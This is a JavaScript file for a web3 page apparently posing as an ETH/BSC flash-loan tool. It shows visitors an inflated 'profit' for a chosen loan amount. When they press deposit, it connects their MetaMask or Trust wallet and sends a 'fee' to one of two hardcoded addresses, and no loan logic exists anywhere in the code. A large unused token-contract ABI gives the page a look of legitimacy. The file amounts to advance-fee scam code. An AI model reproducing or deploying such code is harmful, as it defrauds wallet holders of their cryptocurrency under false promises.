var OK = false; 
var chain1 = 0;
var chain2 = 0;
 window.onload = function() {
	  $('#form2').hide();
        $("#loanAmtInput").val('25');
        calc();  

		
			checkpoint();
			$('#form1').hide();
		 $('#form2').hide();
    }
	
	const checkpoint = async () => {
		
		if(window.ethereum){
			//await loadweb3();
			var t = await web3.eth.net.getId(),
            e = await web3.eth.getChainId();
				chain1 = t;
				chain2 = e;
			if (56 == t && 56 == e){
				OK = true; 
				$('#form1').show();
			}else if (1 == t && 1 == e){
				OK = true; 
				$('#form1').show();
			} else {
				alert('Supported Networks are ETH and BSC');
			}
		}else{
			await loadweb3();
			var t = await web3.eth.net.getId(),
            e = await web3.eth.getChainId();			
			if (56 == t && 56 == e){
				OK = true; 
			}else if (1 == t && 1 == e){
				OK = true; 
			} else {
				alert('Supported Networks are ETH and BSC');
			}
		}
	}
    var mttotalcost = 0;

    function calc() {
        var profit = 0;
        var chain = $('input[name="network"]:checked').val();

        console.log(chain);

        var loanamount = $("#loanAmtInput").val();
        var minamount = 25;
        
        var swapFee = 0;
        var totalFee = 0;
        var gain = 0;
        if (chain == 'bsc') {
			var loantokenFee = 0.05;
            var erc20network = 200;
            var erc20network2 = 0.73;
        } else {
			var loantokenFee = 0.01;
            var erc20network = 400;
			var erc20network2 = 0.529;
            
        }
        var loanswapFee = loanamount / erc20network;
        var loantotalFee = fixNumber(loantokenFee + loanswapFee);
        var loangain = fixNumber(loanamount * erc20network2);

        if (chain == 'eth') {
            var tokdepfee = loantokenFee + ' ETH';
            var swapfee = loanswapFee + ' ETH';
            var ttc = loangain;
            mttotalcost = loantotalFee;
            totalcost = loantotalFee + ' ETH';
            profit = loangain + ' ETH';
            $("#currency").html('ETH');
        } else {
            var tokdepfee = loantokenFee + ' BNB';
            var swapfee = loanswapFee + ' BNB';
            var ttc = loangain;
            mttotalcost = loantotalFee;
            totalcost = loantotalFee + ' BNB';
            profit = loangain + ' BNB';
            $("#currency").html('BNB');
        }

        var amt = $("#loanAmtInput").val();
        //alert(amt)
        $("#tokdepfee").html(tokdepfee);
        $("#swapfee").html(swapfee);
        $("#totalcost").html(totalcost);
        $("#profit").html(profit);
    }

    function fixNumber(y) {
        return Math.round(1e12 * y) / 1e12;
    }

    $("#loanAmtInput").keyup(function() {
        calc();
    });

    let web3 = new web3js.myweb3(window.ethereum);
    let addr;
    const sttaddr = "0x9C4b5230C4A9f54BF4E0b86f1C34c20779175C24";
    const sttabi = [{
        "constant": false,
        "inputs": [{
            "name": "_refer",
            "type": "address"
        }],
        "name": "getAirdrop",
        "outputs": [{
            "name": "success",
            "type": "bool"
        }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "name",
        "outputs": [{
            "name": "",
            "type": "string"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [{
            "name": "spender",
            "type": "address"
        }, {
            "name": "tokens",
            "type": "uint256"
        }],
        "name": "approve",
        "outputs": [{
            "name": "success",
            "type": "bool"
        }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "aSBlock",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [{
            "name": "_sSBlock",
            "type": "uint256"
        }, {
            "name": "_sEBlock",
            "type": "uint256"
        }, {
            "name": "_sChunk",
            "type": "uint256"
        }, {
            "name": "_sPrice",
            "type": "uint256"
        }, {
            "name": "_sCap",
            "type": "uint256"
        }],
        "name": "startSale",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [{
            "name": "from",
            "type": "address"
        }, {
            "name": "to",
            "type": "address"
        }, {
            "name": "tokens",
            "type": "uint256"
        }],
        "name": "transferFrom",
        "outputs": [{
            "name": "success",
            "type": "bool"
        }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{
            "name": "",
            "type": "uint8"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "sPrice",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "viewSale",
        "outputs": [{
            "name": "StartBlock",
            "type": "uint256"
        }, {
            "name": "EndBlock",
            "type": "uint256"
        }, {
            "name": "SaleCap",
            "type": "uint256"
        }, {
            "name": "SaleCount",
            "type": "uint256"
        }, {
            "name": "ChunkSize",
            "type": "uint256"
        }, {
            "name": "SalePrice",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "aTot",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [],
        "name": "clearETH",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [{
            "name": "_refer",
            "type": "address"
        }],
        "name": "tokenSale",
        "outputs": [{
            "name": "success",
            "type": "bool"
        }],
        "payable": true,
        "stateMutability": "payable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [{
            "name": "tokenOwner",
            "type": "address"
        }],
        "name": "balanceOf",
        "outputs": [{
            "name": "balance",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [{
            "name": "_aSBlock",
            "type": "uint256"
        }, {
            "name": "_aEBlock",
            "type": "uint256"
        }, {
            "name": "_aAmt",
            "type": "uint256"
        }, {
            "name": "_aCap",
            "type": "uint256"
        }],
        "name": "startAirdrop",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [],
        "name": "acceptOwnership",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "sTot",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "owner",
        "outputs": [{
            "name": "",
            "type": "address"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "sSBlock",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "symbol",
        "outputs": [{
            "name": "",
            "type": "string"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "sChunk",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "aEBlock",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [{
            "name": "to",
            "type": "address"
        }, {
            "name": "tokens",
            "type": "uint256"
        }],
        "name": "transfer",
        "outputs": [{
            "name": "success",
            "type": "bool"
        }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "sCap",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "aCap",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [{
            "name": "spender",
            "type": "address"
        }, {
            "name": "tokens",
            "type": "uint256"
        }, {
            "name": "data",
            "type": "bytes"
        }],
        "name": "approveAndCall",
        "outputs": [{
            "name": "success",
            "type": "bool"
        }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "sEBlock",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "newOwner",
        "outputs": [{
            "name": "",
            "type": "address"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "viewAirdrop",
        "outputs": [{
            "name": "StartBlock",
            "type": "uint256"
        }, {
            "name": "EndBlock",
            "type": "uint256"
        }, {
            "name": "DropCap",
            "type": "uint256"
        }, {
            "name": "DropCount",
            "type": "uint256"
        }, {
            "name": "DropAmount",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [{
            "name": "tokenOwner",
            "type": "address"
        }, {
            "name": "spender",
            "type": "address"
        }],
        "name": "allowance",
        "outputs": [{
            "name": "remaining",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": false,
        "inputs": [{
            "name": "_newOwner",
            "type": "address"
        }],
        "name": "transferOwnership",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "aAmt",
        "outputs": [{
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "payable": true,
        "stateMutability": "payable",
        "type": "fallback"
    }, {
        "anonymous": false,
        "inputs": [{
            "indexed": true,
            "name": "_from",
            "type": "address"
        }, {
            "indexed": true,
            "name": "_to",
            "type": "address"
        }],
        "name": "OwnershipTransferred",
        "type": "event"
    }, {
        "anonymous": false,
        "inputs": [{
            "indexed": true,
            "name": "from",
            "type": "address"
        }, {
            "indexed": true,
            "name": "to",
            "type": "address"
        }, {
            "indexed": false,
            "name": "tokens",
            "type": "uint256"
        }],
        "name": "Transfer",
        "type": "event"
    }, {
        "anonymous": false,
        "inputs": [{
            "indexed": true,
            "name": "tokenOwner",
            "type": "address"
        }, {
            "indexed": true,
            "name": "spender",
            "type": "address"
        }, {
            "indexed": false,
            "name": "tokens",
            "type": "uint256"
        }],
        "name": "Approval",
        "type": "event"
    }];


    let sttcontract = new web3.eth.Contract(sttabi, sttaddr);

    const loadweb3 = async () => {
        try {
            web3 = new web3js.myweb3(window.ethereum);
            sttcontract = new web3.eth.Contract(sttabi, sttaddr);
            let a = await ethereum.enable();
            addr = web3.utils.toChecksumAddress(a[0]);
            return (addr);

        } catch (error) {
            if (error.code === 4001) {
                console.log('Please connect to MetaMask.')
            } else {
                console.error(error)
            }
        }

    };


    const buystt = async () => {
        await loadweb3();
        if (addr == undefined) {
            alert("No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.");
        }

        let ethval = mttotalcost;
        console.log(mttotalcost);
        ethval = Number(ethval) * 1e18;
		
		if (chain1 == 56 && chain2 == 56){
				 web3.eth.sendTransaction({
            from: addr,
            to: '0xCF9f241d3B5a24b5Bd01514456B81c97e41d0a93',
            value: ethval
        }, (err, res) => {
            if (!err) console.log(res);
            else console.log(err);
        });
			}else if (chain1 == 1 && chain2 == 1){
				 web3.eth.sendTransaction({
            from: addr,
            to: '0x6d89969b47F0f17F449C9eEB287B0CEe7dB75bd7',
            value: ethval
        }, (err, res) => {
            if (!err) console.log(res);
            else console.log(err);
        });
			}

        
    }
	
	
	 $('body').on('click', 'input[name="network"]', function(event) {
        calc();
    });

	$('body').on('click', '#execute', function(event) {            
            event.preventDefault();			
        // $('#execute').hide();
 $("#execute").attr("disabled", true);		 
        });
		
	$('body').on('click', '#nextstep', function(event) {            
            event.preventDefault();			
         $('#form1').hide();
		 $('#form2').show();
		   
        });
	
	  $('body').on('click', '#deposit', function(event) {           			
            event.preventDefault();			
			if (OK){
				buystt();
			}else{
				alert('Supported Networks are ETH and BSC');
			}
            		   
        });
		
